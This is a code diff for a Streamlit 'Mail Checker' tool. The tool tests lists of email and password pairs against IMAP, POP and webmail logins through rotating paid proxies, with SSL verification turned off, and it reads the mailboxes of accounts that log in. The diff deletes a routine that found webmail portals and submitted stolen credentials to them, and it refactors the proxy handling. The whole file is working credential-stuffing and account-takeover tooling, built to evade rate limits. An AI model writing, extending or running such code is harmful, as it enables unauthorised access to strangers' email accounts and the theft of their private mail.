@@ -68,8 +68,8 @@ str_lit.markdown("""
 </style>
 """, unsafe_allow_html=True)
 
-str_lit.title("⚡ Mega Ultimate Mail Checker v10.3 (Strict Authentication Edition)")
-str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with strict session validation and zero false positives.")
+str_lit.title("⚡ Mega Ultimate Mail Checker v10.4 (Pure Protocol Edition)")
+str_lit.markdown("Asynchronous multi-threaded proxy-backed mail validation engine with strict protocol handshake verification and zero false positives.")
 
 # --- Persistent Session State Initialization ---
 if "engine_has_run" not in str_lit.session_state:
@@ -223,52 +223,6 @@ def load_proxies():
     except Exception:
         return OXYLABS_PROXIES
 
-def load_webshare(key):
-    if not requests:
-        return []
-    proxies = []
-    try:
-        url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=250"
-        headers = {"Authorization": f"Token {key}"}
-        response = requests.get(url, headers=headers, timeout=8)
-        if response.status_code == 200:
-            data = response.json()
-            results = data.get("results", [])
-            for item in results:
-                ip = item.get("proxy_address")
-                port = item.get("port")
-                user = item.get("username")
-                pwd = item.get("password")
-                if ip and port:
-                    if user and pwd:
-                        proxies.append(f"{user}:{pwd}@{ip}:{port}")
-                    else:
-                        proxies.append(f"{ip}:{port}")
-    except Exception:
-        pass
-    return proxies
-
-def parse_proxy(proxy_str):
-    if not proxy_str: return None
-    try:
-        p = proxy_str.strip()
-        if "://" in p:
-            u = urlparse(p)
-            return {"host": u.hostname, "port": u.port or 80, "user": u.username, "pass": u.password}
-        if "@" in p:
-            cred, hostpart = p.rsplit("@", 1)
-            user, pwd = cred.split(":", 1)
-            host, port = hostpart.split(":", 1)
-            return {"host": host, "port": int(port), "user": user, "pass": pwd}
-        parts = p.split(":")
-        if len(parts) == 4:
-            return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
-        if len(parts) == 2:
-            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
-    except Exception:
-        pass
-    return None
-
 def compute_real_score(success_count, fail_count, initial_latency_score=80):
     total = success_count + fail_count
     if total == 0:
@@ -356,6 +310,27 @@ def test_single_proxy(proxy_str):
     else:
         return False, "Connection Failed", f"{country}, {region}", current_score
 
+def parse_proxy(proxy_str):
+    if not proxy_str: return None
+    try:
+        p = proxy_str.strip()
+        if "://" in p:
+            u = urlparse(p)
+            return {"host": u.hostname, "port": u.port or 80, "user": u.username, "pass": u.password}
+        if "@" in p:
+            cred, hostpart = p.rsplit("@", 1)
+            user, pwd = cred.split(":", 1)
+            host, port = hostpart.split(":", 1)
+            return {"host": host, "port": int(port), "user": user, "pass": pwd}
+        parts = p.split(":")
+        if len(parts) == 4:
+            return {"host": parts[0], "port": int(parts[1]), "user": parts[2], "pass": parts[3]}
+        if len(parts) == 2:
+            return {"host": parts[0], "port": int(parts[1]), "user": None, "pass": None}
+    except Exception:
+        pass
+    return None
+
 def get_available_countries_with_scores():
     raw = load_proxies()
     country_scores = defaultdict(list)
@@ -413,7 +388,6 @@ elif pool_mode == "mix":
 
 str_lit.sidebar.markdown("---")
 
-secret_portals = instant_help("secret_portals", "Enable strict HTTP webmail portal routes with session validation.", "Secret Portals", widget_type="checkbox", value=True)
 use_proxy = instant_help("use_proxy", "Route all checker requests through proxy nodes to prevent IP rate-limiting.", "Use Proxy", widget_type="checkbox", value=True)
 retry_cf = instant_help("retry_cf", "Automatically retry connection failures using alternative fallback paths.", "Retry CF", widget_type="checkbox", value=False)
 self_signed = instant_help("self_signed", "Bypass strict SSL certificate validation errors for secure connections.", "Allow Self-Signed", widget_type="checkbox", value=True)
@@ -437,7 +411,6 @@ CFG = {
     "ACCOUNT_DEADLINE": deadline,
     "MAX_ACCOUNTS": max_acc,
     "BLACKLIST_CF": blacklist_cf,
-    "ENABLE_SECRET_PORTALS": secret_portals,
     "PROXY_MODE": "off" if not use_proxy else resolved_proxy_mode,
     "RETRY_CONNECTION_FAILED": 1 if retry_cf else 0,
     "ALLOW_SELF_SIGNED": self_signed,
@@ -545,8 +518,22 @@ with str_lit.sidebar:
                 all_raw = []
                 
                 def fetch_ws(key):
-                    return load_webshare(key)
-                
+                    if not requests: return []
+                    proxies = []
+                    try:
+                        url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=250"
+                        headers = {"Authorization": f"Token {key}"}
+                        response = requests.get(url, headers=headers, timeout=8)
+                        if response.status_code == 200:
+                            data = response.json()
+                            for item in data.get("results", []):
+                                ip, port, user, pwd = item.get("proxy_address"), item.get("port"), item.get("username"), item.get("password")
+                                if ip and port:
+                                    proxies.append(f"{user}:{pwd}@{ip}:{port}" if user and pwd else f"{ip}:{port}")
+                    except Exception:
+                        pass
+                    return proxies
+
                 try:
                     with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                         ws_results = executor.map(fetch_ws, WEBSHARE_KEYS)
@@ -558,7 +545,6 @@ with str_lit.sidebar:
                 for ox in OXYLABS_PROXIES:
                     all_raw.append(ox)
                 all_raw = list(dict.fromkeys(all_raw))
-                
                 if not all_raw:
                     all_raw = OXYLABS_PROXIES[:]
 
@@ -598,19 +584,16 @@ with str_lit.sidebar:
                 info = parse_proxy(p_str)
                 host_port = f"{info['host']}:{info['port']}" if info else "Unknown"
                 lat_ms = meta.get("latency_ms", "N/A")
-                latency_display = f"{lat_ms} ms" if isinstance(lat_ms, int) else "N/A"
-
                 proxy_data_list.append({
                     "Proxy": host_port,
-                    "Latency": latency_display,
+                    "Latency": f"{lat_ms} ms" if isinstance(lat_ms, int) else "N/A",
                     "Country": meta.get("country", "Unknown"),
                     "Region": meta.get("region", "Unknown"),
                     "Score": meta.get("score", 50),
                     "Fails": meta.get("fails", 0),
                     "Successes": meta.get("success", 0)
                 })
-            df_proxies = pd.DataFrame(proxy_data_list)
-            str_lit.dataframe(df_proxies, use_container_width=True)
+            str_lit.dataframe(pd.DataFrame(proxy_data_list), use_container_width=True)
             
             col_ref1, col_ref2 = str_lit.columns(2)
             with col_ref1:
@@ -626,7 +609,7 @@ with str_lit.sidebar:
                     str_lit.success("Cleaned!")
                     str_lit.rerun()
         else:
-            str_lit.info("No proxy metadata recorded yet. Click 'Fetch & Test All Proxies' above to populate.")
+            str_lit.info("No proxy metadata recorded yet.")
 
 # --- Pre-filter Engine ---
 DISPOSABLE = {
@@ -754,10 +737,7 @@ with input_tab2:
         try:
             raw_text = uploaded_file.getvalue().decode("utf-8", errors="ignore")
         except Exception:
-            try:
-                raw_text = uploaded_file.getvalue().decode("latin-1", errors="ignore")
-            except Exception:
-                raw_text = ""
+            raw_text = uploaded_file.getvalue().decode("latin-1", errors="ignore")
         str_lit.success("File uploaded successfully!")
 
 clean_lines = []
@@ -927,7 +907,6 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
         pass
     mail.quit()
 
-# --- True Credential Verification Helper ---
 def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
     for h in hosts:
         try:
@@ -990,101 +969,6 @@ def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
     except Exception as e:
         return [f"Error reading mailbox: {str(e)}"]
 
-def find_best_webmail_portal(domain, proxies_dict=None):
-    if not requests:
-        return []
-    candidates = [
-        f"https://webmail.{domain}",
-        f"https://mail.{domain}",
-        f"https://{domain}/webmail",
-        f"https://{domain}/mail",
-        f"https://webmail.{domain}/login.php",
-        f"https://mail.{domain}/login",
-        f"https://auth.{domain}/login"
-    ]
-    scored_portals = []
-    for url in candidates:
-        if "/-/" in url or "logout" in url:
-            continue
-        try:
-            resp = requests.get(url, proxies=proxies_dict, timeout=3, verify=False, allow_redirects=True)
-            if resp.status_code < 400:
-                text_lower = resp.text.lower()
-                score = 0
-                if any(kw in text_lower for kw in ["password", "passwd", "login", "signin", "username"]):
-                    score += 50
-                if any(brand in text_lower for brand in ["roundcube", "horde", "sogo", "zimbra", "outlook", "microsoft"]):
-                    score += 30
-                if resp.url:
-                    score += 10
-                scored_portals.append((score, url))
-        except Exception:
-            continue
-    scored_portals.sort(key=lambda x: x[0], reverse=True)
-    return [portal[1] for portal in scored_portals if portal[0] > 0]
-
-def check_webmail_portal(email, password, domain, proxy_str=None):
-    """
-    STRICT WEBMAIL PORTAL CHECKER:
-    Eliminates false positives by requiring explicit HTTP redirect status (301/302/303/307)
-    or positive session confirmation indicators in response bodies after credential POST submission.
-    """
-    if not requests or not CFG.get("ENABLE_SECRET_PORTALS", True):
-        return None, "connection_failed", "portal disabled or requests missing"
-    
-    proxies_dict = None
-    if proxy_str:
-        p_info = parse_proxy(proxy_str)
-        if p_info:
-            p_url = f"http://{p_info['user']}:{p_info['pass']}@{p_info['host']}:{p_info['port']}" if p_info['user'] else f"http://{p_info['host']}:{p_info['port']}"
-            proxies_dict = {"http": p_url, "https": p_url}
-
-    dynamic_portals = find_best_webmail_portal(domain, proxies_dict)
-    fallback_candidates = [
-        f"https://{domain}/webmail",
-        f"https://mail.{domain}/login",
-        f"https://webmail.{domain}",
-        f"https://{domain}/login.php",
-        f"https://auth.{domain}/login"
-    ]
-    portal_candidates = dynamic_portals if dynamic_portals else fallback_candidates
-    if domain == "empas.com":
-        portal_candidates.insert(0, "https://empas.com/webmail")
-
-    for portal_url in portal_candidates:
-        if "/-/" in portal_url or "logout" in portal_url:
-            continue
-        try:
-            resp = requests.get(portal_url, proxies=proxies_dict, timeout=3, verify=False, allow_redirects=True)
-            if resp.status_code < 400:
-                post_payloads = [
-                    {"user": email, "pass": password, "username": email, "password": password},
-                    {"email": email, "passwd": password},
-                    {"rcm_user": email, "rcm_pass": password}
-                ]
-                for pl in post_payloads:
-                    try:
-                        r_post = requests.post(portal_url, data=pl, proxies=proxies_dict, timeout=4, verify=False, allow_redirects=False)
-                        
-                        # Strict Validation Rule: Must trigger secure session redirect or body token match
-                        if r_post.status_code in [301, 302, 303, 307]:
-                            loc = r_post.headers.get("Location", "").lower()
-                            if not any(err_word in loc for err_word in ["error", "fail", "login", "auth"]):
-                                return portal_url, "valid", f"Portal Verified | {portal_url}"
-                        
-                        body_lower = r_post.text.lower()
-                        if any(k in body_lower for k in ["logout", "inbox", "welcome", "mailbox", "session", "messages"]):
-                            if not any(err_word in body_lower for err_word in ["invalid password", "wrong password", "incorrect"]):
-                                return portal_url, "valid", f"Portal Verified | {portal_url}"
-                                
-                        if any(k in body_lower for k in ["invalid password", "wrong password", "incorrect", "authentication failed"]):
-                            return None, "wrong_password", f"Portal | {portal_url} -> wrong_password"
-                    except Exception:
-                        continue
-        except Exception:
-            continue
-    return None, "connection_failed", "portal could not strictly verify credentials"
-
 def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, trace_logs=None):
     if trace_logs is None:
         trace_logs = []
@@ -1103,10 +987,10 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                 if not thread_state.get("sticky_proxy"):
                     thread_state["sticky_proxy"] = random.choice(proxy_pool)
                 px = thread_state["sticky_proxy"]
-                trace_logs.append(f"Proxy [Sticky Mode Assigned]: {px.split('@')[-1]}")
+                trace_logs.append(f"Proxy [Sticky Mode]: {px.split('@')[-1]}")
             else:
                 px = random.choice(proxy_pool)
-                trace_logs.append(f"Proxy [Random Pool Assigned]: {px.split('@')[-1]}")
+                trace_logs.append(f"Proxy [Random Pool]: {px.split('@')[-1]}")
         else:
             trace_logs.append("Proxy Engine: Disabled or Direct Connection.")
 
@@ -1114,19 +998,6 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         if proxy_mode == "fallback" and px:
             proxies_to_try.append(None)
             trace_logs.append("Proxy Mode: Fallback enabled (will try direct if proxy fails).")
-
-        if CFG.get("ENABLE_SECRET_PORTALS", True):
-            trace_logs.append("Secret Portals: Scanning strict HTTP webmail portal routes...")
-            for current_px in proxies_to_try:
-                portal_srv, portal_st, portal_det = check_webmail_portal(email, password, domain, current_px)
-                if portal_st == "valid":
-                    trace_logs.append(f"-> SUCCESS via HTTP Webmail Portal: {portal_det}")
-                    return portal_srv, "valid", portal_det, current_px, trace_logs
-                elif portal_st == "wrong_password":
-                    trace_logs.append(f"-> FAILED (Wrong Password) via Portal: {portal_det}")
-                    return None, "wrong_password", portal_det, current_px, trace_logs
-                else:
-                    trace_logs.append(f"-> Portal check missed/failed on route: {portal_det}")
 
         for current_px in proxies_to_try:
             for server in conf.get("imap", [])[:3]:
@@ -1157,7 +1028,7 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
         trace_logs.append(f"Critical Exception in background check runner: {str(e)}")
         return None, "connection_failed", str(e)[:40], None, trace_logs
 
-    trace_logs.append("All protocol endpoints and fallback routes exhausted: connection_failed")
+    trace_logs.append("All protocol endpoints exhausted: connection_failed")
     return None, "connection_failed", "all hosts failed", None, trace_logs
 
 # --- Execution Trigger & Persistent UI Display ---
